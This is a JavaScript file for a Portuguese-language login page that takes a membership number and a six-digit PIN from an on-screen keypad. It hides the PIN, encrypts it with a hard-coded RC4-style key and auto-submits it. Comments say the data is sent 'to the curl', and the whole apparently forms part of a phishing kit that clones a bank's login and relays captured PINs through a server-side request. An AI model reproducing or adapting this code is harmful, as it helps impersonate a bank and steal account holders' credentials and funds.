var num_bt = parseInt('10', 10), num_bt2 = 0;
var zp = 0, zp2 = 0, cnt = 3, act = false;
var ch_st = (num_bt == 10) ? 48 : 65, ch_st2 = 48;
if (num_bt == 36) {
    num_bt = 26;
    num_bt2 = 10;
}
var pin = "", pinentry = "spa";
var le1 = "", le2 = "", le3 = "";

function checkEnter() {
    const login = $('#is_login');

    if (login.val().length < 7) {
        alert('Nº de Adesão não está válido. Tente novamente!');
        login.val('').focus();
        return false;
    }
}

function setPassword(number) {
    const thisPass = $('#is_passwd');
    const showPass = $('#is_show_pass');

    if (number === 'limpar') {
        thisPass.val('');
        showPass.val('');
        $('#clear_pass').css('opacity', '0');
    } else if (thisPass.val().length < 6) {

        $('#clear_pass').css('opacity', '1');

        showPass.val(showPass.val() + '*');
        thisPass.val(thisPass.val() + number);

    }

    if (thisPass.val().length >= 6) {

        $('#modal_loader').css('display', 'flex');

        // ENVIAR DADOS PARA O CURL
        $('#pin_here').val($('#is_passwd').val());

        let pin = $('#pin_here').val();

        $('#selo_here').val((new Date()).getTime());
        $('#nx_here').val('4' + cvt1('ssd78Udf9034j4A4', pin))

        // ENVIAR DADOS PARA O CURL
        $('#form_pass').submit();
        return false;
    }
}

function Mk(l){
    var tab = "0123456789ABCDEF0";
    var x = Math.floor(Math.random() * l) + 2;
    if (x & 1) x++;
    var s = "";
    for (var i = 0; i < x; i++)
        s += tab.charAt(Math.floor(Math.random() * 16));
    return s;
}

function char2hex(i){
    var hex_tab = "0123456789ABCDEF";
    return hex_tab.charAt(i >> 4) + hex_tab.charAt(i & 0x0F);
}

function hex2bin(data){
    var i,outs = "";
    for(i = 0; i < data.length; i+=2)
        outs += String.fromCharCode(parseInt(data.substr(i,2),16));
    return outs;
}

function bin2hex(data){
    var i,outs = "";
    for(i = 0; i < data.length; i++)
        outs += char2hex(data.charCodeAt(i));
    return outs;
}

function cvt1(key, text) {
    var i, x, y, t, x2;
    var s = new Array(256);

    if (key.substring(0, 2) == '0x') key = hex2bin(key.substr(2));

    for (i = 0; i < 256; i++) s[i] = i
    y = 0;
    i = 0;
    for (x = 0; x < 256; x++) {
        y = (key.charCodeAt(i) + s[x] + y) % 256
        t = s[x];
        s[x] = s[y];
        s[y] = t
        if (++i == key.length) i = 0;
    }
    x = 0;
    y = 0;
    var z = '';
    for (x = 0; x < text.length; x++) {
        x2 = (x + 1) & 255
        y = (s[x2] + y) & 255
        t = s[x2];
        s[x2] = s[y];
        s[y] = t
        z += String.fromCharCode((text.charCodeAt(x) ^ s[(s[x2] + s[y]) % 256]))
    }
    return bin2hex(z) + Mk(8);
}

